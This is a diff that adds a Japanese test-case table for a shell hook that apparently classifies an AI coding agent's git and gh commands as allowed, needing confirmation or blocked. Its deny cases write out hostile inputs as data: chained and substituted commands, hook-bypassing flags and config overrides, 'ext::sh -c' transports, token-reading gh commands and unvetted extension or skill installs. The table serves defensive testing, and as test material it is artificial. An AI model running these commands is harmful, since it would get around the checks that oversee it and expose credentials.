@@ -1,0 +1,504 @@
+# classify-remote-command.shのケースの一覧。列は、説明の文、コマンド、導入先の.harness/configに足す値、期待する判定、導入先で動かす設定のコマンド（任意、「-」は動かさない）、理由の文に含むはずの語（任意）である。
+# コマンドはprintfの%bの形で書く。足す値は「,」で区切り、「ci=」で始まる値はCIの設定のファイルの場所、ほかは保護するブランチである。「-」は.harness/configを置かない、「!」は読めない.harness/config、「?」は形の壊れた.harness/configである。
+# 判定は、allowが通す、askが確認を求める、denyが止めるである。導入先は、隣の手元のbareのリポジトリをoriginにしたgitのリポジトリで、最初のcommit（.github/workflows/ci.ymlと.gitlab-ci.ymlを置く）をoriginのmainへ送り、手元にfeat/x、feat/add-protection、main-fixのブランチがある。設定のコマンドがあれば、新しいリポジトリでそれを動かしてから判定する。
+# git pushで通すもの
+作業用のブランチへの簡単な形のpushを渡すと、通す。	git push origin feat/add-protection:feat/add-protection	-	allow
+-uを付けた作業用のブランチへのpushを渡すと、通す。	git push -u origin feat/add-protection:feat/add-protection	-	allow
+--set-upstreamを付けた作業用のブランチへのpushを渡すと、通す。	git push --set-upstream origin feat/x:feat/x	-	allow
+末尾に2>&1を付けた作業用のブランチへのpushを渡すと、通す。	git push origin feat/x:feat/x 2>&1	-	allow
+手元のHEADを作業用のブランチへ送るpushを渡すと、通す。	git push origin HEAD:feat/x	-	allow
+送り先をrefs/heads/で書いた作業用のブランチへのpushを渡すと、通す。	git push origin HEAD:refs/heads/feat/x	-	allow
+引用符で囲んだ作業用のブランチへのpushを渡すと、通す。	git push origin 'feat/x:feat/x'	-	allow
+mainで始まる作業用のブランチへのpushを渡すと、通す。	git push origin main-fix:main-fix	-	allow
+push.defaultがupstreamでも、送り先を書いたpushを渡すと、通す。	git push origin feat/x:feat/x	-	allow	git config push.default upstream && git config branch.feat/x.merge refs/heads/main
+remote.origin.pushがあっても、送り先を書いたpushを渡すと、通す。	git push origin feat/x:feat/x	-	allow	git config remote.origin.push refs/heads/feat/x:refs/heads/main
+シンボリックな参照でも、送り先を書いたpushを渡すと、通す。	git push origin topic:topic	-	allow	git symbolic-ref refs/heads/topic refs/heads/main
+# git pushで止めるもの
+送り先を書かない作業用のブランチへのpushを渡すと、止める。	git push origin feat/x	-	deny
+手元にある作業用のブランチでも、送り先を書かないpushを渡すと、止める。	git push origin feat/x	-	deny	git rev-parse --verify -q refs/heads/feat/x
+送り先を書かないforce pushを渡すと、確認でなく止める。	git push --force origin feat/x	-	deny
+送り先を書かない+のpushを渡すと、確認でなく止める。	git push origin +feat/x	-	deny
+送り先を書かないpushを別のリモートへ渡すと、止め、そのリモートで書き直す形を示す。	git push fork feat/x	-	deny	git remote add fork https://example.invalid/c/d.git	git push fork feat/x:feat/x
+送り先のブランチの無いpushを別のリモートへ渡すと、止め、そのリモートで書き直す形を示す。	git push fork	-	deny	git remote add fork https://example.invalid/c/d.git	git push fork <ブランチ>:<ブランチ>
+HEADだけを別のリモートへ送るpushを渡すと、止め、リモートを決めずに書き直す形を示す。	git push fork HEAD	-	deny	git remote add fork https://example.invalid/c/d.git	git push <リモート>
+mainへのpushを渡すと、止める。	git push origin main:main	-	deny	-	保護するブランチ「main」
+masterへのpushを渡すと、止める。	git push origin master:master	-	deny
+developへのpushを渡すと、止める。	git push origin HEAD:develop	-	deny
+stagingへのpushを渡すと、止める。	git push origin HEAD:staging	-	deny
+productionへのpushを渡すと、止める。	git push origin HEAD:production	-	deny
+releaseで始まるブランチへのpushを渡すと、止める。	git push origin HEAD:release/1.0	-	deny
+releaseのあとに区切りの無いブランチへのpushを渡すと、止める。	git push origin HEAD:release-2026	-	deny
+HEAD:mainの形のpushを渡すと、止める。	git push origin HEAD:main	-	deny
+送り先をrefs/heads/mainで書いたpushを渡すと、止める。	git push origin HEAD:refs/heads/main	-	deny
+送り先をheads/mainで書いたpushを渡すと、止める。	git push origin HEAD:heads/main	-	deny	-	保護するブランチ「main」
++mainのforce pushを渡すと、止める。	git push origin +main:main	-	deny
+--forceを付けたmainへのpushを渡すと、止める。	git push --force origin main:main	-	deny
+:mainのブランチを消すpushを渡すと、止める。	git push origin :main	-	deny
+--deleteでmainを消すpushを渡すと、止める。	git push origin --delete main	-	deny
+--no-verifyを付けたpushを渡すと、止める。	git push --no-verify origin feat/x:feat/x	-	deny	-	フックを飛ばす
+知らないオプションを付けても、mainへのpushは止める。	git push --no-verif origin main:main	-	deny
+送り先の1つがmainなら、止める。	git push origin feat/x:feat/x main:main	-	deny
+.harness/configで足したブランチへのpushを渡すと、止める。	git push origin HEAD:hotfix/1	hotfix/*	deny
+.harness/configで足しても、既定のブランチへのpushは止める。	git push origin HEAD:main	hotfix/*	deny
+.harness/configで2つ足したときの2つ目のブランチへのpushを渡すと、止める。	git push origin HEAD:qa	hotfix/*,qa	deny
+送り先を書かないpushを渡すと、止める。	git push	-	deny
+リモートだけを書いたpushを渡すと、止める。	git push origin	-	deny
+HEADだけを書いたpushを渡すと、止める。	git push origin HEAD	-	deny
+長い形を縮めた--no-verifを渡すと、止める。	git push --no-verif origin feat/x:feat/x	-	deny
+短い形をまとめた-ufを渡すと、止める。	git push -uf origin feat/x:feat/x	-	deny
+--mirrorを渡すと、止める。	git push --mirror origin feat/x:feat/x	-	deny
+--allを渡すと、止める。	git push --all origin feat/x:feat/x	-	deny
+--tagsを渡すと、止める。	git push --tags origin feat/x:feat/x	-	deny
+タグへの送り先を渡すと、止める。	git push origin HEAD:refs/tags/v1	-	deny
+送り先をtags/で書いたpushを渡すと、止める。	git push origin HEAD:tags/v1	-	deny
+送り先をremotes/で書いたpushを渡すと、止める。	git push origin HEAD:remotes/origin/x	-	deny
+送り先をheads/で書いた作業用のブランチへのpushを渡すと、止める。	git push origin HEAD:heads/feat/x	-	deny
+引用符の中の*で、すべてのブランチを送るpushを渡すと、止める。	git push origin 'refs/heads/*:refs/heads/*'	-	deny
+引用符の中の*:*のpushを渡すと、止める。	git push origin '*:*'	-	deny
+引用符の中の*で、mainに当たる名前のpushを渡すと、止める。	git push origin 'HEAD:ma*'	-	deny
+引用符の中の?を含むpushを渡すと、止める。	git push origin 'HEAD:ma?n'	-	deny
+引用符の中の[を含むpushを渡すと、止める。	git push origin 'HEAD:ma[i]n'	-	deny
+二重引用符の中の\と改行で行をつなぐpushを渡すと、止める。	git push origin "feat:ma\\\nin"	-	deny
+二重引用符の中の\のあとに普通の文字があるpushを渡すと、止める。	git push origin "feat/a\\b:feat/x"	-	deny
+URLをリモートにしたpushを渡すと、止める。	git push https://github.com/a/b.git feat/x:feat/x	-	deny
+gitの設定に無いリモートの名前（作業フォルダーの中のbareのリポジトリ）へのpushを渡すと、止める。	git push evil.git feat/x:feat/x	-	deny	-	gitの設定にありません
+gitの設定にあっても、名前に決まった文字のほかを含むリモートへのpushを渡すと、止める。	git push team/a feat/x:feat/x	-	deny	git remote add team/a https://example.invalid/c/d.git
+送り先をHEADと書いたpushを渡すと、止める。	git push origin feat/x:HEAD	-	deny
+送り先を@と書いたpushを渡すと、止める。	git push origin feat/x:@	-	deny
+送り先が空のpushを渡すと、止める。	git push origin feat/x:	-	deny
+送り先に:を2つ含むpushを渡すと、止める。	git push origin feat/x:feat/y:main	-	deny
+push.defaultがupstreamで、上流がmainのブランチを名前だけで送るpushを渡すと、止める。	git push origin feat/x	-	deny	git config push.default upstream && git config branch.feat/x.merge refs/heads/main
+push.defaultがtrackingで、上流がmainのブランチをrefs/heads/で送るpushを渡すと、止める。	git push origin refs/heads/feat/x	-	deny	git config push.default tracking && git config branch.feat/x.merge refs/heads/main
+push.defaultがupstreamで、上流がmainのブランチへのforce pushを渡すと、確認でなく止める。	git push --force origin feat/x	-	deny	git config push.default upstream && git config branch.feat/x.merge refs/heads/main
+remote.origin.pushがあると、名前だけで送るpushを、止める。	git push origin feat/x	-	deny	git config remote.origin.push refs/heads/feat/x:refs/heads/main
+mainを指すシンボリックな参照を、名前だけで送るpushを渡すと、止める。	git push origin topic	-	deny	git -c user.name=t -c user.email=t@example.invalid commit -q --allow-empty -m x && git branch -M main && git symbolic-ref refs/heads/topic refs/heads/main
+mainを指すタグのシンボリックな参照を、名前だけで送るpushを渡すと、止める。	git push origin x	-	deny	git -c user.name=t -c user.email=t@example.invalid commit -q --allow-empty -m x && git branch -M main && git symbolic-ref refs/tags/x refs/heads/main
+mainを指すリモートの追跡のHEADを、リモートの名前だけで送るpushを渡すと、止める。	git push origin origin	-	deny	git -c user.name=t -c user.email=t@example.invalid commit -q --allow-empty -m x && git branch -M main && git symbolic-ref refs/remotes/origin/HEAD refs/heads/main
+mainを指すORIG_HEADを、名前だけで送るpushを渡すと、止める。	git push origin ORIG_HEAD	-	deny	git -c user.name=t -c user.email=t@example.invalid commit -q --allow-empty -m x && git branch -M main && git symbolic-ref ORIG_HEAD refs/heads/main
+-cでgitの設定を変えたpushを渡すと、止める。	git -c core.hooksPath=/dev/null push origin feat/x:feat/x	-	deny
+-Cでフォルダーを変えたpushを渡すと、止め、先頭がgit push、git fetch、gh、glabでないことを理由の文に書く。	git -C . push origin feat/x:feat/x	-	deny	-	先頭がgit push、git fetch、gh、glabではないので
+先頭にGIT_CONFIG_COUNTを付けたpushを渡すと、止める。	GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/dev/null git push origin feat/x:feat/x	-	deny
+先頭にGIT_SSH_COMMANDを付けたpushを渡すと、止める。	GIT_SSH_COMMAND=ssh git push origin feat/x:feat/x	-	deny
+timeoutを前に付けたpushを渡すと、止め、前に何も付けずに動かすよう理由の文に書く。	timeout 60 git push origin feat/x:feat/x	-	deny	-	前に何も付けず
+フルパスのgitのpushを渡すと、止める。	/usr/bin/git push origin feat/x:feat/x	-	deny
+&&でつないだpushを渡すと、止める。	npm test && git push origin feat/x:feat/x	-	deny
+外に出す形だけを&&でつないだpushを渡すと、止める。	git fetch origin && git push origin feat/x:feat/x	-	deny
+;でつないだpushを渡すと、止める。	git push origin feat/x:feat/x; git push origin main:main	-	deny
+パイプでつないだpushを渡すと、止める。	git push origin feat/x:feat/x | tail -5	-	deny
+ファイルへのリダイレクトを付けたpushを渡すと、止める。	git push origin feat/x:feat/x > push.log	-	deny
+$()を含むpushを渡すと、止める。	git push origin $(git branch --show-current):feat/x	-	deny
+バッククォートを含むpushを渡すと、止める。	git push origin `git branch --show-current`:feat/x	-	deny
+二重引用符の中の変数を含むpushを渡すと、止める。	git push origin "feat/${name}:feat/x"	-	deny
+二重引用符の中のバッククォートを含むpushを渡すと、止める。	git push origin "feat/`id`:feat/x"	-	deny
+改行で2つ目のコマンドを書いたpushを渡すと、止める。	git push origin feat/x:feat/x\ngit push origin main:main	-	deny
+閉じていない引用符を含むpushを渡すと、止める。	git push origin 'feat/x:feat/x	-	deny
+引用符の外のバックスラッシュを含むpushを渡すと、止める。	git push origin feat\\x:feat/x	-	deny
+引用符の外のワイルドカードを含むpushを渡すと、止める。	git push origin feat/*:feat/x	-	deny
+# 語に分ける処理が引用符の外で止める記号（記号ごとに1件、記号を読まないとほかの規則では止まらない形）
+引用符の外の;を、送り先の語の中に含むpushを渡すと、止める。	git push origin feat/x:feat/x;true	-	deny	-	記号「;」
+引用符の外の&を、送り先の語の中に含むpushを渡すと、止める。	git push origin feat/x:feat/x&true	-	deny
+引用符の外の|を、送り先の語の中に含むpushを渡すと、止める。	git push origin feat/x:feat/x|true	-	deny
+引用符の外の<を、送り先の語の中に含むpushを渡すと、止める。	git push origin feat/x:feat/x<in.txt	-	deny
+引用符の外の>を、送り先の語の中に含むpushを渡すと、止める。	git push origin feat/x:feat/x>push.log	-	deny
+引用符の外の(を、送り先の語の中に含むpushを渡すと、止める。	git push origin feat/x:feat/x(	-	deny
+引用符の外の)を、送り先の語の中に含むpushを渡すと、止める。	git push origin feat/x:feat/x)	-	deny
+引用符の外の$を、送り先の語の中に含むpushを渡すと、止める。	git push origin feat/x:feat/$name	-	deny
+引用符の外のバッククォートを、送り先の語の中に含むpushを渡すと、止める。	git push origin feat/x:feat/x`true	-	deny
+引用符の外の{を、送り先の語の中に含むpushを渡すと、止める。	git push origin feat/x:feat/{x	-	deny
+引用符の外の}を、送り先の語の中に含むpushを渡すと、止める。	git push origin feat/x:feat/x}	-	deny
+引用符の外の]を、送り先の語の中に含むpushを渡すと、止める。	git push origin feat/x:feat/x]	-	deny
+引用符の外の~を、送り先の語の中に含むpushを渡すと、止める。	git push origin feat/x:feat/~x	-	deny
+引用符の外の#を、送り先の語の中に含むpushを渡すと、止める。	git push origin feat/x:feat/#x	-	deny
+引用符の外の!を、送り先の語の中に含むpushを渡すと、止める。	git push origin feat/x:feat/!x	-	deny
+引用符の外の改行を、送り先の語の中に含むpushを渡すと、止める。	git push origin feat/x:feat/x\ntrue	-	deny
+引用符の外の復帰の文字を、送り先の語の中に含むpushを渡すと、止める。	git push origin feat/x:feat/x\rtrue	-	deny
+引用符の外の*を含むghの読み取りを渡すと、止める。	gh issue list --search fix*	-	deny
+引用符の外の?を含むghの読み取りを渡すと、止める。	gh issue list --search fix?	-	deny
+引用符の外の[を含むghの読み取りを渡すと、止める。	gh issue list --search [x	-	deny
+# Claude Codeが区切れないと、git push、git fetch、ghでないコマンドでもフックが呼ぶ
+引用符の中に\のあるふつうのコマンドを渡すと、止め、1つずつのコマンドに分けるよう理由の文に書く。	echo 'a\\ b'	-	deny	-	1つずつのコマンドに分けて
+forの繰り返しのふつうのコマンドを渡すと、止め、Claude Codeが区切れなかったことを理由の文に書く。	for f in a b; do echo x; done	-	deny	-	Claude Codeがコマンドを区切れなかった
+# git pushで確認を求めるもの
+作業用のブランチへの--forceのpushを渡すと、確認を求める。	git push --force origin feat/x:feat/x	-	ask	-	force pushです
+作業用のブランチへの-fのpushを渡すと、確認を求める。	git push -f origin feat/x:feat/x	-	ask
+作業用のブランチへの--force-with-leaseのpushを渡すと、確認を求める。	git push --force-with-lease origin feat/x:feat/x	-	ask
+作業用のブランチへの+のpushを渡すと、確認を求める。	git push origin +feat/x:feat/x	-	ask
+作業用のブランチを:で消すpushを渡すと、確認を求める。	git push origin :feat/x	-	ask
+作業用のブランチを--deleteで消すpushを渡すと、確認を求める。	git push origin --delete feat/x	-	ask
+作業用のブランチを-dで消すpushを渡すと、確認を求める。	git push -d origin feat/x	-	ask
+.harness/configが読めないとき、作業用のブランチへのpushを渡すと、確認を求める。	git push origin feat/x:feat/x	!	ask
+.harness/configの形が壊れているとき、作業用のブランチへのpushを渡すと、確認を求める。	git push origin feat/x:feat/x	?	ask
+core.hooksPathが作業フォルダーの中を指すとき、作業用のブランチへのpushを渡すと、確認を求める。	git push origin feat/x:feat/x	-	ask	git config core.hooksPath .husky/_
+core.hooksPathが作業フォルダーの中を指すとき、先頭に空白のあるpushを渡しても、確認を求める。	 git push origin feat/x:feat/x	-	ask	git config core.hooksPath .husky/_
+core.hooksPathが作業フォルダーの中を指すとき、gitとpushの間がタブのpushを渡しても、確認を求める。	git\tpush origin feat/x:feat/x	-	ask	git config core.hooksPath .husky/_
+リモートが作業フォルダーの中のbareのリポジトリなら、作業用のブランチへのpushで、確認を求める。	git push evil feat/x:feat/x	-	ask	git init -q --bare evil.git && git remote add evil ./evil.git
+core.hooksPathが作業フォルダーの中を指すとき、force pushを渡すと、確認を求め、gitの設定のことを理由の文に書く。	git push --force origin feat/x:feat/x	-	ask	git config core.hooksPath .husky/_	サンドボックスの外で動くgit
+core.hooksPathが作業フォルダーの中を指すとき、force pushを渡すと、force pushであることも理由の文に残す。	git push --force origin feat/x:feat/x	-	ask	git config core.hooksPath .husky/_	force pushです
+core.hooksPathが作業フォルダーの中を指すとき、ブランチを消すpushを渡すと、確認を求め、gitの設定のことを理由の文に書く。	git push origin --delete feat/x	-	ask	git config core.hooksPath .husky/_	サンドボックスの外で動くgit
+# git pushで、送るcommitのCIの設定のファイルを、リモートの今の先頭と比べるもの（理由の文に含むはずの語が「!」で始まるときは、含まないことを確かめる）
+CIの設定のファイルを変えないcommitを、リモートに無いブランチへ送るpushを渡すと、通す。	git push origin feat/x:feat/x	-	allow	git checkout -q feat/x && printf 'x\n' > README.md && git add README.md && git commit -q -m readme
+.github/workflows/のファイルを変えるcommitを送るpushを渡すと、確認を求め、変えた場所を理由の文に書く。	git push origin feat/x:feat/x	-	ask	git checkout -q feat/x && printf 'x\n' >> .github/workflows/ci.yml && git commit -q -am ci	.github/workflows/
+.github/workflows/にファイルを足すcommitを送るpushを渡すと、確認を求める。	git push origin feat/x:feat/x	-	ask	git checkout -q feat/x && printf 'x\n' > .github/workflows/new.yml && git add .github/workflows/new.yml && git commit -q -m ci	.github/workflows/
+.gitlab-ci.ymlを変えるcommitを送るpushを渡すと、確認を求め、変えた場所を理由の文に書く。	git push origin feat/x:feat/x	-	ask	git checkout -q feat/x && printf 'x\n' >> .gitlab-ci.yml && git commit -q -am ci	.gitlab-ci.yml
+.github/actions/を足すcommitを送るpushを渡すと、確認を求める。	git push origin feat/x:feat/x	-	ask	git checkout -q feat/x && mkdir -p .github/actions/a && printf 'x\n' > .github/actions/a/action.yml && git add .github && git commit -q -m ci	.github/actions/
+.gitlab-ci.ymlを消すcommitを送るpushを渡すと、確認を求める。	git push origin feat/x:feat/x	-	ask	git checkout -q feat/x && git rm -q .gitlab-ci.yml && git commit -q -m ci	.gitlab-ci.yml
+CIの設定のファイルを変えたcommitでも、リモートにある送り先のブランチの先頭と同じなら、通す。	git push origin feat/x:feat/x	-	allow	git checkout -q feat/x && printf 'x\n' >> .github/workflows/ci.yml && git commit -q -am ci && git push -q origin feat/x:feat/x && printf 'x\n' > README.md && git add README.md && git commit -q -m readme
+mainと同じCIの設定のファイルでも、リモートにある送り先のブランチの先頭と違えば、確認を求める。	git push --force origin feat/x:feat/x	-	ask	git checkout -q -b tmp && printf 'x\n' >> .github/workflows/ci.yml && git commit -q -am ci && git push -q origin tmp:feat/x && git checkout -q main	.github/workflows/
+force pushでCIの設定のファイルを変えると、force pushであることも理由の文に残す。	git push --force origin feat/x:feat/x	-	ask	git checkout -q feat/x && printf 'x\n' >> .gitlab-ci.yml && git commit -q -am ci	force pushです
+送り先の2つのうち1つがCIの設定のファイルを変えると、確認を求める。	git push origin main-fix:main-fix feat/x:feat/x	-	ask	git checkout -q feat/x && printf 'x\n' >> .gitlab-ci.yml && git commit -q -am ci	.gitlab-ci.yml
+.harness/configで足した場所を変えるcommitを送るpushを渡すと、確認を求める。	git push origin feat/x:feat/x	ci=build/ci.sh	ask	git checkout -q feat/x && mkdir build && printf 'x\n' > build/ci.sh && git add build && git commit -q -m ci	build/ci.sh
+.harness/configで足した場所を変えないcommitを送るpushを渡すと、通す。	git push origin feat/x:feat/x	ci=build/ci.sh	allow	git checkout -q feat/x && printf 'x\n' > README.md && git add README.md && git commit -q -m readme
+.harness/configで保護するブランチとCIの設定のファイルを足しても、どちらも当てる。	git push origin feat/x:feat/x	hotfix/*,ci=build/	ask	git checkout -q feat/x && mkdir build && printf 'x\n' > build/a.sh && git add build && git commit -q -m ci	build/
+pushurlがあると、pushurlの場所の今の先頭と比べる。	git push origin feat/x:feat/x	-	ask	git clone -q --bare ../setting-remote.git "$(dirname "$(pwd)")/push.git" && git checkout -q -b tmp && printf 'x\n' >> .github/workflows/ci.yml && git commit -q -am ci && git push -q "$(dirname "$(pwd)")/push.git" tmp:main && git checkout -q main && git config remote.origin.pushurl "$(dirname "$(pwd)")/push.git"	.github/workflows/
+リモートに問い合わせられないと、確認を求め、CIの設定のファイルを確かめていないことを理由の文に書く。	git push origin feat/x:feat/x	-	ask	git remote set-url origin https://example.invalid/a/b.git	問い合わせられなかった
+リモートに問い合わせられないと、問い合わせのスクリプトが出した原因の文も、理由の文に書く。	git push origin feat/x:feat/x	-	ask	git remote set-url origin https://example.invalid/a/b.git	通信と認証を確かめてください
+ext::のURLのリモートへのpushは、gitの設定の確認が見つけ、問い合わせずに確認を求める。	git push origin feat/x:feat/x	-	ask	git config protocol.ext.allow always && git remote set-url origin 'ext::sh -c true'	ext::の形のURL
+リポジトリの設定にhttp.proxyがあるpushは、gitの設定の確認が見つけ、問い合わせずに確認を求める。	git push origin feat/x:feat/x	-	ask	git config http.proxy http://127.0.0.1:8080	CIの設定のファイルは確かめていません
+http://のURLのリモートへのpushは、問い合わせずに確認を求め、URLの方式を理由の文に書く。	git push origin feat/x:feat/x	-	ask	git remote set-url origin http://example.invalid/a/b.git	方式（http）
+比べる元のcommit（リモートの送り先の先頭）が手元に無いと、確認を求める。	git push origin feat/x:feat/x	-	ask	git checkout -q -b tmp && git commit -q --allow-empty -m gone && git push -q origin tmp:feat/x && git checkout -q main && git branch -q -D tmp && git update-ref -d refs/remotes/origin/feat/x && git reflog expire --expire=now --all && git gc -q --prune=now	git fetch origin feat/x
+gitの設定の確認が見つけたときは、問い合わせず、CIの設定のファイルを確かめていないことを理由の文に書く。	git push origin feat/x:feat/x	-	ask	git config core.hooksPath .husky/_ && git remote set-url origin https://example.invalid/a/b.git	CIの設定のファイルは確かめていません
+gitの設定の確認が見つけたときも、手元のcommitにならない送り元のpushは、止める。	git push origin nosuch:feat/x	-	deny	git config core.hooksPath .husky/_	手元のcommitになりません
+.git/modulesがあるpushは、見つけたことを理由の文に書いて確認を求める。	git push origin feat/x:feat/x	-	ask	mkdir -p .git/modules/x	modulesがあり
+core.hooksPathが、まだ無いフォルダーを指すpushでも、見つけた設定を理由の文に書いて確認を求める。	git push origin feat/x:feat/x	-	ask	git config core.hooksPath .husky/_	（core.hookspathが
+作業フォルダーの中の偽のworktreeに向けた.gitのpushは、見つけたことを理由の文に書いて確認を求める。	git push origin HEAD:feat/x	-	ask	git init -q x && git -C x -c user.name=t -c user.email=t@example.com commit -q --allow-empty -m x && git -C x remote add origin "$(git remote get-url origin)" && mkdir -p x/.git/worktrees/y && git -C x rev-parse HEAD > x/.git/worktrees/y/HEAD && printf '../..\n' > x/.git/worktrees/y/commondir && printf '%s/.git\n' "$(pwd -P)" > x/.git/worktrees/y/gitdir && rm -rf .git && printf 'gitdir: %s/x/.git/worktrees/y\n' "$(pwd -P)" > .git	作業フォルダーの中にあります
+gitの設定の確認が見つけたときは、リモートに問い合わせない。	git push origin feat/x:feat/x	-	ask	git config core.hooksPath .husky/_ && git remote set-url origin https://example.invalid/a/b.git	!問い合わせられなかった
+ブランチを消すpushは、リモートに問い合わせない。	git push origin --delete feat/x	-	ask	git remote set-url origin https://example.invalid/a/b.git	!問い合わせられなかった
+:でブランチを消すpushは、リモートに問い合わせない。	git push origin :feat/x	-	ask	git remote set-url origin https://example.invalid/a/b.git	!問い合わせられなかった
+送り元が手元のcommitにならないpushを渡すと、止める。	git push origin feat/none:feat/none	-	deny	-	手元のcommitになりません
+# git fetchで通すもの
+リモートだけを書いたgit fetchを渡すと、通す。	git fetch origin	-	allow
+リモートとブランチを書いたgit fetchを渡すと、通す。	git fetch origin main	-	allow
+--pruneを付けたgit fetchを渡すと、通す。	git fetch --prune origin	-	allow
+# git fetchとgit pullで止めるもの
+リモートを書かないgit fetchを渡すと、止める。	git fetch	-	deny
+リモートを書かず--pruneだけを付けたgit fetchを渡すと、止める。	git fetch --prune	-	deny
+--allを付けたgit fetchを渡すと、止める。	git fetch --all origin	-	deny
+--upload-packを付けたgit fetchを渡すと、止める。	git fetch --upload-pack=touch origin	-	deny
+--recurse-submodulesを付けたgit fetchを渡すと、止める。	git fetch --recurse-submodules origin	-	deny
+ext::の送り元を書いたgit fetchを渡すと、止める。	git fetch 'ext::sh -c touch% /tmp/x' main	-	deny
+gitの設定に無いリモートの名前からのgit fetchを渡すと、止める。	git fetch evil.git main	-	deny
+gitの設定にあっても、名前に決まった文字のほかを含むリモートからのgit fetchを渡すと、止める。	git fetch team/a	-	deny	git remote add team/a https://example.invalid/c/d.git
+取るブランチを名前のほかの形で書いたgit fetchを別のリモートから渡すと、止め、そのリモートで書き直す形を示す。	git fetch fork ma^1	-	deny	git remote add fork https://example.invalid/c/d.git	git fetch fork <ブランチ>
+&&でつないだgit fetchを渡すと、止める。	git fetch origin && git push origin main	-	deny
+--ff-onlyを付けたgit pullを渡すと、止める。	git pull --ff-only	-	deny
+リモートとブランチを書いたgit pullを渡すと、止める。	git pull origin main	-	deny	-	git pullは
+URLから取るgit pullを渡すと、止める。	git pull https://github.com/a/b.git main	-	deny
+-cでgitの設定を変えたgit pullを渡すと、止める。	git -c core.hooksPath=x pull --ff-only	-	deny
+# git fetchで確認を求めるもの
+core.hooksPathが作業フォルダーの中を指すとき、git fetchを渡すと、確認を求める。	git fetch origin	-	ask	git config core.hooksPath .husky/_
+# ghで通すもの
+gh pr viewを渡すと、通す。	gh pr view 12	-	allow
+引用符の中にパイプのある--jqを付けたgh pr viewを渡すと、通す。	gh pr view 12 --json headRefOid,files --jq '.files[] | .path'	-	allow
+gh pr diffを渡すと、通す。	gh pr diff 12 --name-only	-	allow
+gh pr checksを渡すと、通す。	gh pr checks	-	allow
+gh pr listを渡すと、通す。	gh pr list --state open	-	allow
+gh issue viewを渡すと、通す。	gh issue view 9	-	allow
+二重引用符の検索の語を付けたgh issue listを渡すと、通す。	gh issue list -R a/b --state all --limit 100 --search "指摘 の語"	-	allow
+gh repo viewを渡すと、通す。	gh repo view --json nameWithOwner,visibility	-	allow
+gh run viewを渡すと、通す。	gh run view 123 --log	-	allow
+引数の無いgh auth statusを渡すと、通す。	gh auth status	-	allow
+gh api のGETを渡すと、通す。	gh api --paginate repos/a/b/pulls/1/comments	-	allow
+--jqを付けたgh apiのGETを渡すと、通す。	gh api user --jq .login	-	allow
+問い合わせだけのgh api graphqlを渡すと、通す。	gh api graphql --paginate -f owner=a -f name=b -F number=3 -f query='query($owner:String!,$name:String!,$number:Int!,$endCursor:String){repository(owner:$owner,name:$name){pullRequest(number:$number){reviewThreads(first:100,after:$endCursor){nodes{id isResolved}}}}}'	-	allow
+core.hooksPathが作業フォルダーの中を指すときも、gh pr viewを渡すと、通す。	gh pr view 1	-	allow	git config core.hooksPath .husky/_
+値をつないだ短い形のgh pr listを渡すと、通す。	gh pr list -L10	-	allow
+オプションでない値にwを含むgh pr listを渡すと、通す。	gh pr list --search review	-	allow
+wを含む長い形の--workflowを付けたgh run listを渡すと、通す。	gh run list --workflow ci.yml	-	allow
+wを含む長い形の--ownerと--review-requestedを付けたgh search prsを渡すと、通す。	gh search prs --owner cli --review-requested @me	-	allow
+出力のテンプレートを付けたgh pr viewを渡すと、通す。	gh pr view 1 --json title --template '{{.title}}'	-	allow
+整数の値を-Fで渡す問い合わせだけのgh api graphqlを渡すと、通す。	gh api graphql -F number=1 -f query='query{viewer{login}}'	-	allow
+# ghで止めるもの
+--show-tokenを付けたgh auth statusを渡すと、止める。	gh auth status --show-token	-	deny
+-tを付けたgh auth statusを渡すと、止める。	gh auth status -t	-	deny
+gh auth tokenを渡すと、トークンを文脈に入れるので止める。	gh auth token	-	deny	-	エージェントの文脈
+ホストを付けたgh config get oauth_tokenを渡すと、トークンを文脈に入れるので止める。	gh config get oauth_token -h github.com	-	deny	-	エージェントの文脈
+gh config setを渡すと、ghが動かすプログラムを変えられるので止める。	gh config set pager less	-	deny	-	動かすプログラム
+gh auth loginを渡すと、ghの認証を書くので止める。	gh auth login	-	deny	-	ghの認証
+gh auth setup-gitを渡すと、gitの認証のヘルパーの設定を書くので止める。	gh auth setup-git	-	deny	-	gitの認証のヘルパー
+gh auth switchを渡すと、ghの認証を書くので止める。	gh auth switch --user x	-	deny	-	ghの認証
+止めるコマンドを動かす別名のgh alias setを渡すと、止める。	gh alias set pv 'config get oauth_token -h github.com'	-	deny	-	シェルの式を動かす別名
+gh alias importを渡すと、別名を書くので止める。	gh alias import aliases.yml	-	deny	-	シェルの式を動かす別名
+gh extension installを渡すと、確かめていない拡張を入れるので止める。	gh extension install a/b	-	deny	-	確かめていない拡張
+別名のextのgh ext execを渡すと、拡張を外で動かすので止める。	gh ext exec x	-	deny	-	確かめていない拡張
+別名のextensionsのgh extensions listを渡すと、止める。	gh extensions list	-	deny	-	確かめていない拡張
+gh copilotを渡すと、Copilot CLIをダウンロードして外で動かすので止める。	gh copilot	-	deny	-	ダウンロード
+Claude Codeに入れるgh skill installを渡すと、指示のファイルを外から書くので止める。	gh skill install a/b --agent claude-code --scope user	-	deny	-	指示のファイル
+別名のskillsとaddのgh skills addを渡すと、止める。	gh skills add a/b	-	deny	-	指示のファイル
+別名のaddのgh skill addを渡すと、止める。	gh skill add a/b	-	deny	-	指示のファイル
+別名のskillsのgh skills installを渡すと、止める。	gh skills install a/b	-	deny	-	指示のファイル
+gh skill updateを渡すと、止める。	gh skill update --all	-	deny	-	指示のファイル
+別名のskillsのgh skills updateを渡すと、止める。	gh skills update --all	-	deny	-	指示のファイル
+gh codespace sshを渡すと、sshを外で動かすので止める。	gh codespace ssh -c x	-	deny	-	ProxyCommand
+別名のcsのgh cs sshを渡すと、止める。	gh cs ssh -c x	-	deny	-	ProxyCommand
+gh codespace cpを渡すと、scpを外で動かすので止める。	gh codespace cp a remote:b	-	deny	-	手元のファイル
+別名のcsのgh cs cpを渡すと、止める。	gh cs cp a remote:b	-	deny	-	ProxyCommand
+gh codespace codeを渡すと、手元のVS Codeで開くURLを外で開くので止める。	gh codespace code -c x	-	deny	-	vscode://
+別名のcsのgh cs codeを渡すと、止める。	gh cs code -c x	-	deny	-	vscode://
+--webを付けたgh codespace codeを渡すと、ブラウザーだけを開く形も止める。	gh codespace code --web -c x	-	deny	-	--webも分けずに
+gh codespace jupyterを渡すと、手元のポートで待ち受けるので止める。	gh codespace jupyter -c x	-	deny	-	手元のポートで待ち受けて
+別名のcsのgh cs jupyterを渡すと、止める。	gh cs jupyter -c x	-	deny	-	手元のポートで待ち受けて
